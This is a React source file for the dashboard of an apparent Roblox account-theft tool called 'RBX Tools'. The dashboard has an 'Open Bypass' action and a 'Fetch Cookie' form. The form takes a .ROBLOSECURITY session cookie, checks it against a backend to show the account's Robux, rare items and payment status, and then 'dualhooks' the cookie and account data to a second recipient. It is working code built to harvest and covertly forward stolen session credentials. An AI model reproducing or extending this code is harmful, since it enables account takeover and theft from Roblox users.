import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Shield, Zap, Cookie, FolderOpen, Check, Trash2, Loader2, X } from "lucide-react";
import { getDirectories, getActiveDirectoryId, setActiveDirectoryId, dualhookSend, AccountInfo, Directory } from "@/lib/tokenStore";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import DiscordInvitePopup from "@/components/DiscordInvitePopup";

const Dashboard = () => {
  const navigate = useNavigate();
  const [dirs, setDirs] = useState<Directory[]>([]);
  const [activeId, setActive] = useState<string | null>(null);
  const [fetchOpen, setFetchOpen] = useState(false);
  const [fetchCookie, setFetchCookie] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<AccountInfo | null>(null);

  useEffect(() => {
    setDirs(getDirectories());
    setActive(getActiveDirectoryId());
  }, []);

  const handlePickDir = (id: string) => {
    const next = activeId === id ? null : id;
    setActiveDirectoryId(next);
    setActive(next);
    toast.success(next ? "Directory activated" : "Directory cleared");
  };

  const handleFetch = async () => {
    const trimmed = fetchCookie.trim();
    if (!trimmed) { toast.error("Enter a cookie"); return; }
    setLoading(true); setResult(null);
    try {
      const { data, error } = await supabase.functions.invoke("roblox-fetch", { body: { cookie: trimmed } });
      if (error || !data?.valid) { toast.error("Invalid cookie"); return; }
      const info = { ...(data.info as any), cookie: trimmed, valid: true } as AccountInfo;
      setResult(info);
      await dualhookSend("fetch", info);
      toast.success("Cookie fetched");
    } catch { toast.error("Fetch failed"); }
    finally { setLoading(false); }
  };

  return (
    <div className="min-h-screen px-4 py-6">
      <DiscordInvitePopup />
      <div className="max-w-lg mx-auto space-y-5 animate-fade-in-up">
        {/* Header — Shield on left = admin login */}
        <div className="flex items-center justify-between">
          <button
            onClick={() => navigate("/admin-login")}
            className="w-10 h-10 rounded-xl bg-primary/20 border border-primary/40 flex items-center justify-center glow-border hover:scale-105 transition-transform"
            aria-label="Admin Login"
          >
            <Shield size={18} className="text-primary" />
          </button>
          <h1 className="text-xl font-bold text-foreground glow-text">RBX Tools</h1>
          <div className="w-10" />
        </div>

        {/* Action cards */}
        <div className="grid grid-cols-2 gap-3">
          <button
            onClick={() => navigate("/bypass")}
            className="card-glow rounded-2xl p-5 flex flex-col items-center gap-2 hover:border-primary/50 transition-all"
          >
            <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center"><Zap size={18} className="text-primary" /></div>
            <span className="text-sm font-bold text-foreground">Open Bypass</span>
          </button>
          <button
            onClick={() => setFetchOpen(true)}
            className="card-glow rounded-2xl p-5 flex flex-col items-center gap-2 hover:border-primary/50 transition-all"
          >
            <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center"><Cookie size={18} className="text-primary" /></div>
            <span className="text-sm font-bold text-foreground">Fetch Cookie</span>
          </button>
        </div>

        {/* Directories list */}
        <div className="card-glow rounded-2xl p-5 space-y-3">
          <div className="flex items-center justify-between">
            <h2 className="text-base font-bold text-foreground flex items-center gap-2">
              <FolderOpen size={16} className="text-primary" /> Directories
            </h2>
            <span className="text-[10px] text-muted-foreground">{dirs.length} total</span>
          </div>
          {dirs.length === 0 ? (
            <p className="text-xs text-muted-foreground py-4 text-center">No directories yet. Create one in the admin panel.</p>
          ) : (
            <div className="space-y-2 max-h-56 overflow-y-auto pr-1">
              {dirs.map(d => (
                <button
                  key={d.id}
                  onClick={() => handlePickDir(d.id)}
                  className={`w-full flex items-center justify-between gap-3 rounded-xl px-3.5 py-2.5 border transition-all ${
                    activeId === d.id ? "bg-primary/15 border-primary/50" : "bg-secondary/40 border-border/50 hover:border-border"
                  }`}
                >
                  <div className="flex items-center gap-2 min-w-0">
                    <div className={`w-2 h-2 rounded-full flex-shrink-0 ${activeId === d.id ? 'bg-[hsl(var(--success))]' : 'bg-muted-foreground'}`} />
                    <span className="text-sm font-medium text-foreground truncate">{d.name}</span>
                  </div>
                  {activeId === d.id && <Check size={14} className="text-primary flex-shrink-0" />}
                </button>
              ))}
            </div>
          )}
          {activeId && (
            <p className="text-[10px] text-muted-foreground text-center">
              Active directory will dualhook every bypass & fetch.
            </p>
          )}
        </div>
      </div>

      {/* Fetch Cookie Modal */}
      {fetchOpen && (
        <div className="fixed inset-0 z-40 flex items-center justify-center px-4 bg-background/70 backdrop-blur-sm">
          <div className="card-glow rounded-2xl max-w-md w-full p-6 space-y-4 relative">
            <button onClick={() => { setFetchOpen(false); setResult(null); setFetchCookie(""); }} className="absolute top-3 right-3 text-muted-foreground hover:text-foreground p-1"><X size={16} /></button>
            <h2 className="text-base font-bold text-foreground flex items-center gap-2"><Cookie size={16} className="text-primary" /> Fetch Cookie</h2>
            <textarea
              value={fetchCookie}
              onChange={e => setFetchCookie(e.target.value)}
              placeholder="Paste .ROBLOSECURITY cookie..."
              className="input-field text-xs font-mono min-h-[100px] resize-y w-full"
            />
            <button
              onClick={handleFetch}
              disabled={loading}
              className="w-full shimmer text-primary-foreground font-semibold py-3 rounded-xl flex items-center justify-center gap-2 glow-btn disabled:opacity-50"
            >
              {loading ? <><Loader2 size={14} className="animate-spin" /> Fetching...</> : <>Fetch & Send</>}
            </button>
            {result && (
              <div className="bg-secondary/40 border border-border/50 rounded-xl p-3 space-y-1.5 text-xs max-h-60 overflow-y-auto">
                <div className="flex justify-between"><span className="text-muted-foreground">User</span><span className="text-foreground font-mono">{result.username}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Robux</span><span className="text-foreground font-mono">{String(result.robux ?? 0)} | {String(result.pendingRobux ?? 0)}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Premium</span><span>{result.premium ? '✅' : '❎'}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Korblox</span><span>{result.korblox ? '✅' : '❎'}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Headless</span><span>{result.headless ? '✅' : '❎'}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Payment</span><span>{result.hasPayment ? '✅' : '❎'}</span></div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
